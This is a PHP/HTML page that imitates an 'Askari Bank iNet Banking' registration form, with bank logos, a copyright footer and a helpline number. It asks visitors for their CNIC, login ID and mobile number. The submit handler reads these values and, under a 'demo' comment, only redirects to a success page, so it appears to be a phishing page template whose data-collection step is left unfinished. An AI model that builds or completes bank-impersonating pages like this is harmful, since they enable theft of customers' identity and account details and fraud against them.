<?php
// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cnic = $_POST['cnic'] ?? '';
    $login_id = $_POST['login_id'] ?? '';
    $mobile = $_POST['mobile'] ?? '';

    // For demo: just redirect
    header("Location: success.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Askari Bank iNet Banking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Bootstrap -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background-color: #fff;
      font-family: Arial, sans-serif;
    }
    .logo-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 40px;
    }
    .header {
      background-color: #1c5d99;
      color: white;
      padding: 10px;
      text-align: center;
      font-weight: bold;
      font-size: 18px;
      margin-left: 500px;
      margin-right: 250px;
    }
    .card {
      margin: 40px auto;
      max-width: 900px;
      border-radius: 0;
      border: 1px solid #ccc;
    }
    .card-header {
      background-color: #1c5d99;
      color: white;
      font-weight: bold;
    }
    .btn-proceed {
      background-color: #1c5d99;
      color: white;
      border-radius: 3px;
    }
    .btn-cancel {
      background-color: #e5e5e5;
      color: black;
      border-radius: 3px;
    }
    .footer {
      background-color: #1c5d99;
      color: white;
      text-align: center;
      padding: 10px;
      margin-top: 30px;
      font-size: 13px;
    }
    .form-label {
      font-weight: bold;
      margin-top: 10px;
    }
    .logo-left {
    margin-left: 220px; /* Left logo aur line ke darmiyan space */
    margin-top: 50px;
    
    height: 100px;
}

.logo-right {
    margin-left: 20px; /* Right logo aur line ke darmiyan space */
}

    small {
      color: #1c5d99;
      display: block;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <!-- Logos -->
  <div class="logo-bar d-flex justify-content-between align-items-center px-4" >
  <img src="askari1.png" class="logo-left" alt="Askari Digital" >
  <img src="askari2.png" alt="Askari Bank Logo" height="50">
</div>

<!-- Blue Header -->
<div class="header">
  Welcome to Askari Bank iNet Banking
</div>

  <!-- Form -->
  <div class="card">
    <div class="card-header">Register</div>
    <div class="card-body">
      <form method="post">
        <div class="mb-3 row">
          <label for="cnic" class="col-sm-2 col-form-label">CNIC:</label>
          <div class="col-sm-6">
            <input type="text" class="form-control" id="cnic" name="cnic" placeholder="Enter CNIC" required>
            <small>[e.g 12345-1234567-1]</small>
          </div>
        </div>

        <div class="mb-3 row">
          <label for="login_id" class="col-sm-2 col-form-label">Login ID:</label>
          <div class="col-sm-6">
            <input type="text" class="form-control" id="login_id" name="login_id" placeholder="Enter Login ID" minlength="8" maxlength="20" required>
            <small>[Min 8 and Max 20 characters]</small>
          </div>
        </div>

        <div class="mb-3 row">
          <label for="mobile" class="col-sm-2 col-form-label">Mobile Number:</label>
          <div class="col-sm-6">
            <input type="text" class="form-control" id="mobile" name="mobile" placeholder="Enter Mobile Number" required>
            <small>[e.g 03217654321]</small>
          </div>
        </div>

        <div class="mt-3">
          <button type="submit" class="btn btn-proceed">Proceed</button>
          <button type="button" class="btn btn-cancel" onclick="window.location.href='index.php'">Cancel</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    Copyright © 2025 Askari Bank. All rights reserved. Terms of Service - Copyright/IP Policy Helpline: 111-000-787
  </div>

</body>
</html>
